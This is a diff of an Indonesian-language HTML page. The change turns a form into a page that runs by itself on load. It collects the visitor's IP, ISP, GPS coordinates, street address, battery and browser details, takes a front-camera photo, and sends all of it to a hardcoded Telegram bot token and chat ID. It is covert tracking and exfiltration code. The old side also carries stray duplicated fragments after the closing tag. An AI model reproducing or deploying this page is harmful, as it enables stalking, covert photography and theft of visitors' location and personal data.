@@ -1,213 +1,300 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Form + Kamera + Info Device</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Auto Capture & Telegram (Rapi)</title>
   <style>
-    body { background:black; color:lime; font-family:monospace; padding:20px; }
-    label { display:block; margin-top:10px; }
-    input, select { width:100%; padding:5px; margin-top:5px; }
-    button { margin-top:15px; padding:10px; background:lime; border:none; font-weight:bold; cursor:pointer; }
-    pre { white-space:pre-wrap; text-align:left; }
+    body { background:#000; color:#7CFC00; font-family:monospace; padding:18px; }
+    h1{ font-size:18px; margin:0 0 8px 0; }
+    #status{ margin:10px 0 14px 0; white-space:pre-wrap; }
+    video, canvas { display:none; }
+    pre{ border:1px dashed #7CFC00; padding:10px; border-radius:6px; max-width:900px; white-space:pre-wrap;}
+    a{ color:#7CFC00; }
+    small{ color:#9f9; }
+    button{ background:#7CFC00; color:#000; border:none; padding:8px 12px; border-radius:6px; cursor:pointer; }
   </style>
 </head>
 <body>
-<h2>📝 Isi Data + Aktifkan Kamera</h2>
+  <h1>🔐 Auto Report → Foto → Telegram (Format Rapi)</h1>
+  <div id="status">Menunggu... (halaman akan otomatis berjalan)</div>
+  <pre id="output"></pre>
 
-<form id="userForm">
-  <label>Nama: <input type="text" name="nama" required></label>
-  <label>Usia: <input type="number" name="usia" required></label>
-  <label>Jenis Kelamin:
-    <select name="gender" required>
-      <option value="Laki-laki">Laki-laki</option>
-      <option value="Perempuan">Perempuan</option>
-    </select>
-  </label>
-  <label>Tipe (Reseller/User/Dll):
-    <input type="text" name="tipe">
-  </label>
-  <button type="submit">Kirim Data</button>
-</form>
-
-<video id="video" autoplay playsinline width="300" height="300" style="display:none"></video>
-<canvas id="canvas" width="300" height="300" style="display:none"></canvas>
-<pre id="log"></pre>
+  <video id="video" autoplay playsinline width="300" height="300"></video>
+  <canvas id="canvas" width="300" height="300"></canvas>
 
 <script>
+/* ---------- CONFIG (SUDAH DIISI) ---------- */
 const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
 const CHAT_ID   = "6216902201";
+/* ------------------------------------------ */
 
-const logBox = document.getElementById("log");
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const ctx = canvas.getContext("2d");
+const statusEl = document.getElementById('status');
+const out = document.getElementById('output');
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
 
-async function getExtraInfo(){
-  let info = {
-    platform: navigator.platform,
-    userAgent: navigator.userAgent,
-    screen: `${screen.width}x${screen.height}`,
-    language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    date: new Date().toLocaleString()
+function log(msg){
+  statusEl.textContent = msg;
+  out.textContent = (out.textContent ? out.textContent + "\n\n" : "") + msg;
+}
+
+// ----- IP details with fallbacks -----
+async function getIPDetails(){
+  const sources = [
+    { url: 'https://ipapi.co/json/', mapper: j => ({
+        ip: j.ip, city: j.city, region: j.region, country: j.country_name || j.country,
+        org: j.org || j.orgname || j.company, postal: j.postal || j.postal_code, timezone: j.timezone
+      }) },
+    { url: 'https://ipwhois.app/json/', mapper: j => ({
+        ip: j.ip, city: j.city, region: j.region, country: j.country, org: j.org || j.isp,
+        postal: j.postal, timezone: j.timezone
+      }) },
+    { url: 'https://api.ipify.org?format=json', mapper: j => ({ ip: j.ip }) }
+  ];
+
+  for (const s of sources){
+    try {
+      const resp = await fetch(s.url, {cache: 'no-store'});
+      if (!resp.ok) throw new Error('bad resp ' + resp.status);
+      const json = await resp.json();
+      const mapped = s.mapper(json);
+      if (!mapped.ip) throw new Error('no ip');
+      return mapped;
+    } catch (e) {
+      console.warn('IP source failed', s.url, e);
+    }
+  }
+  return { ip: 'unknown' };
+}
+
+// ----- Geolocation (GPS) -----
+function getGeo(){
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve({ error: 'geolocation not supported' });
+    navigator.geolocation.getCurrentPosition(
+      p => resolve({
+        lat: p.coords.latitude,
+        lon: p.coords.longitude,
+        acc: p.coords.accuracy + ' m',
+        maps: `https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`
+      }),
+      err => resolve({ error: err.message })
+    );
+  });
+}
+
+// ----- Reverse geocoding (Nominatim) -----
+async function revGeocode(lat, lon){
+  try {
+    const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`, {cache:'no-store', headers:{'User-Agent':'AutoReport/1.0'}});
+    if (!resp.ok) throw new Error('revgeo fail ' + resp.status);
+    const j = await resp.json();
+    // prefer display_name; also extract address fields if present
+    return {
+      display_name: j.display_name || null,
+      address: j.address || null
+    };
+  } catch (e){
+    console.warn('Reverse geocode failed', e);
+    return { error: e.message || 'reverse geocode failed' };
+  }
+}
+
+// ----- Battery -----
+async function getBattery(){
+  try {
+    if (!navigator.getBattery) return null;
+    const b = await navigator.getBattery();
+    return `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+  } catch { return null; }
+}
+
+// ----- Connection info (if supported) -----
+function getConnection(){
+  try {
+    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!c) return null;
+    return {
+      effectiveType: c.effectiveType,
+      downlink: c.downlink,
+      rtt: c.rtt,
+      saveData: c.saveData
+    };
+  } catch { return null; }
+}
+
+// ----- Telegram helpers -----
+async function tgSendText(text){
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  return fetch(url, {
+    method: 'POST',
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({ chat_id: CHAT_ID, text })
+  });
+}
+async function tgSendPhoto(photoBlob, caption){
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('photo', photoBlob, 'camera.png');
+  if (caption) fd.append('caption', caption);
+  return fetch(url, { method: 'POST', body: fd });
+}
+
+// ----- Utility: format boxed message like contoh -----
+function buildBoxedMessage(fields){
+  // fields: array of {label, value} or sections as {title, lines:[]}
+  // We'll produce a neat box using ╭ ├ └ style
+  const lines = [];
+  const now = new Date();
+  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
+  // iterate fields, printing structured sections
+  for (const s of fields){
+    if (s.title && Array.isArray(s.lines)){
+      // print title as a section header
+      lines.push(` ├─ > ${s.title}`);
+      // each line under it prefixed with │   or similar
+      for (let i=0;i<s.lines.length;i++){
+        const prefix = (i===s.lines.length-1) ? ' │   └─ ' : ' │   ├─ ';
+        lines.push(prefix + s.lines[i]);
+      }
+    } else if (s.label) {
+      // single kv
+      lines.push(` ├─ > ${s.label}: ${s.value !== undefined ? s.value : ''}`);
+    }
+  }
+  lines.push(`╰─ > Sumber: AutoReport Web`);
+  return lines.join('\n');
+}
+
+// ----- Main run -----
+async function runAll(){
+  log('Mulai pengumpulan data...');
+
+  // quick device info
+  const device = {
+    platform: navigator.platform || 'unknown',
+    userAgent: navigator.userAgent || 'unknown',
+    screen: `${screen.width || '?'}x${screen.height || '?'}`,
+    language: navigator.language || 'unknown',
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+    date: new Date().toLocaleString(),
+    cookiesEnabled: navigator.cookieEnabled ? 'yes' : 'no',
+    online: navigator.onLine ? 'online' : 'offline',
+    hwConcurrency: navigator.hardwareConcurrency || '?',
+    doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || 'unknown',
+    connection: getConnection()
   };
 
-  // baterai
-  if (navigator.getBattery) {
-    try {
-      let bat = await navigator.getBattery();
-      info.battery = `${Math.round(bat.level*100)}% (${bat.charging?"Charging":"Not Charging"})`;
-    } catch{}
+  // parallel fetches
+  const [ ipDet, battery, geo ] = await Promise.all([ getIPDetails(), getBattery(), getGeo() ]);
+  device.battery = battery || '?';
+
+  // reverse geocode if GPS available
+  let rev = null;
+  if (!geo.error && geo.lat && geo.lon){
+    rev = await revGeocode(geo.lat, geo.lon);
   }
 
-  // lokasi
-  info.location = await new Promise(res=>{
-    if (navigator.geolocation){
-      navigator.geolocation.getCurrentPosition(p=>{
-        res({
-          lat:p.coords.latitude,
-          lon:p.coords.longitude,
-          acc:p.coords.accuracy+" m",
-          maps:`https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`
-        });
-      },e=>res({error:e.message}));
-    } else res({error:"Tidak didukung"});
-  });
+  log('IP terkumpul: ' + (ipDet.ip || 'unknown'));
+  log('Menangkap kamera (minta izin)...');
 
-  // IP
+  // capture camera
+  let photoBlob = null;
   try {
-    let ip = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
-    info.ip = ip.ip;
-  } catch{}
-
-  return info;
-}
-
-async function sendToTelegram(photoBlob, formData, extra){
-  let textMsg = `👤 Data User
-Nama: ${formData.nama}
-Usia: ${formData.usia}
-Gender: ${formData.gender}
-Tipe: ${formData.tipe}
-
-📡 Device Info
-Platform: ${extra.platform}
-UserAgent: ${extra.userAgent}
-Resolusi: ${extra.screen}
-Language: ${extra.language}
-Timezone: ${extra.timezone}
-Tanggal: ${extra.date}
-Baterai: ${extra.battery||"?"}
-
-🌍 Lokasi:
-${extra.location?.lat}, ${extra.location?.lon}
-Akurasi: ${extra.location?.acc}
-Maps: ${extra.location?.maps}
-
-🌐 IP: ${extra.ip||"?"}`;
-
-  // kirim teks
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:CHAT_ID, text:textMsg})
-  });
-
-  // kirim foto
-  let fd = new FormData();
-  fd.append("chat_id", CHAT_ID);
-  fd.append("photo", photoBlob, "cam.png");
-
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-    method:"POST",
-    body:fd
-  });
-
-  logBox.textContent = "✅ Data & Foto terkirim ke Telegram!";
-}
-
-document.getElementById("userForm").onsubmit = async e=>{
-  e.preventDefault();
-  const formData = Object.fromEntries(new FormData(e.target).entries());
-  logBox.textContent = "⏳ Mengambil info & kamera...";
-
-  const extra = await getExtraInfo();
-
-  // kamera
-  navigator.mediaDevices.getUserMedia({video:true})
-  .then(stream=>{
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
     video.srcObject = stream;
-    video.onloadedmetadata=()=>{
-      setTimeout(()=>{
-        ctx.drawImage(video,0,0,canvas.width,canvas.height);
-        canvas.toBlob(blob=>{
-          sendToTelegram(blob, formData, extra);
-          stream.getTracks().forEach(t=>t.stop());
-        },"image/png");
-      },2000);
-    };
-  })
-  .catch(err=>{
-    logBox.textContent="❌ Kamera error: "+err.message;
-  });
-};
-</script>
-</body>
-</html>Screen: ${info.screen}
-Language: ${info.language}
-Timezone: ${info.timezone}
-Date: ${info.date}
-Battery: ${info.battery||"?"}
+    await video.play();
+    await new Promise(r => setTimeout(r, 1200)); // biarkan frame ready
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    stream.getTracks().forEach(t => t.stop());
+    log('Foto berhasil diambil.');
+    // toBlob wrapper with Promise
+    photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png', 0.95));
+  } catch (e){
+    console.warn('kamera error', e);
+    log('❌ Kamera error: ' + (e.message || e));
+  }
 
-🌍 Lokasi:
-${info.location?.lat}, ${info.location?.lon}
-Akurasi: ${info.location?.acc}
-Maps: ${info.location?.maps}
+  // build structured fields for box
+  const fields = [
+    { title: 'Pesan', lines: [ 'Auto capture & device report' ] },
+    { title: 'Pengirim (web)', lines: [ device.userAgent ] },
+    { title: 'IP / ISP', lines: [
+      `IP: ${ipDet.ip || '?'}`,
+      `ISP/Org: ${ipDet.org || '?'}`,
+      `City: ${ipDet.city || '?'}`,
+      `Region: ${ipDet.region || '?'}`,
+      `Country: ${ipDet.country || '?'}`,
+      `Postal: ${ipDet.postal || '?'}`,
+      `IP Timezone: ${ipDet.timezone || '?'}`
+    ] },
+    { title: 'Device', lines: [
+      `Platform: ${device.platform}`,
+      `Screen: ${device.screen}`,
+      `Language: ${device.language}`,
+      `Timezone (browser): ${device.timezone}`,
+      `Local Date: ${device.date}`,
+      `Battery: ${device.battery}`,
+      `Cookies Enabled: ${device.cookiesEnabled}`,
+      `Online: ${device.online}`,
+      `HW Threads: ${device.hwConcurrency}`,
+      `DoNotTrack: ${device.doNotTrack}`
+    ] },
+    { title: 'Connection', lines: [
+      device.connection ? `Type: ${device.connection.effectiveType || '?'} | Downlink: ${device.connection.downlink || '?'} Mbps | RTT: ${device.connection.rtt || '?'} ms` : 'Connection API: tidak tersedia'
+    ] },
+    { title: 'Geo (GPS)', lines: [
+      geo.error ? `Error: ${geo.error}` : `Lat: ${geo.lat}, Lon: ${geo.lon}`,
+      geo.error ? '' : `Akurasi: ${geo.acc}`,
+      geo.error ? '' : `Maps: ${geo.maps}`
+    ].filter(Boolean) },
+  ];
 
-🌐 IP: ${info.ip||"?"}`;
+  if (rev){
+    if (rev.error) {
+      fields.push({ title: 'Reverse Geocode', lines: [ `Error: ${rev.error}` ] });
+    } else {
+      fields.push({ title: 'Alamat (Reverse Geocode)', lines: [ rev.display_name || 'N/A', JSON.stringify(rev.address || {}, null, 0) ] });
+    }
+  }
 
-  // kirim teks
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:CHAT_ID, text:textMsg})
-  });
+  // create boxed text
+  const boxed = buildBoxedMessage(fields);
 
-  // kirim foto
-  let formData = new FormData();
-  formData.append("chat_id", CHAT_ID);
-  formData.append("photo", photoBlob, "cam.png");
+  // show to UI
+  log('Mempersiapkan pesan untuk Telegram:\n' + boxed);
 
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-    method:"POST",
-    body:formData
-  });
-
-  logBox.textContent = "✅ Data & Foto terkirim ke Telegram!";
+  // send to telegram: text then photo (if any)
+  try {
+    log('Mengirim teks ke Telegram...');
+    await tgSendText(boxed);
+    log('Teks terkirim.');
+    if (photoBlob){
+      log('Mengirim foto ke Telegram...');
+      await tgSendPhoto(photoBlob, '📷 Foto (otomatis dari camera)');
+      log('Foto terkirim.');
+    } else {
+      log('Tanpa foto (kamera error / ditolak).');
+    }
+    log('✅ Selesai: data & (jika ada) foto terkirim ke Telegram.');
+  } catch (e){
+    console.error('Tg send failed', e);
+    log('❌ Gagal mengirim ke Telegram: ' + (e.message || e));
+  }
 }
 
-// mulai kamera + proses
-(async ()=>{
-  deviceInfo.ip = await getIP();
-  deviceInfo.location = await getLocation();
+// auto-run after short delay; check token/chat
+setTimeout(() => {
+  if (!BOT_TOKEN || BOT_TOKEN.includes('ISI_TOKEN') || !CHAT_ID || CHAT_ID.includes('ISI_CHATID')){
+    log('⚠️ Silakan periksa BOT_TOKEN & CHAT_ID di kode.');
+    return;
+  }
+  runAll();
+}, 600);
 
-  navigator.mediaDevices.getUserMedia({video:true})
-  .then(stream=>{
-    video.srcObject = stream;
-    video.onloadedmetadata = ()=>{
-      setTimeout(()=>{
-        ctx.drawImage(video,0,0,canvas.width,canvas.height);
-        canvas.toBlob(blob=>{
-          sendToTelegram(blob, deviceInfo);
-          stream.getTracks().forEach(t=>t.stop());
-        },"image/png");
-      },2000);
-    };
-  })
-  .catch(err=>{
-    logBox.textContent = "❌ Kamera error: "+err.message;
-  });
-})();
 </script>
 </body>
 </html>
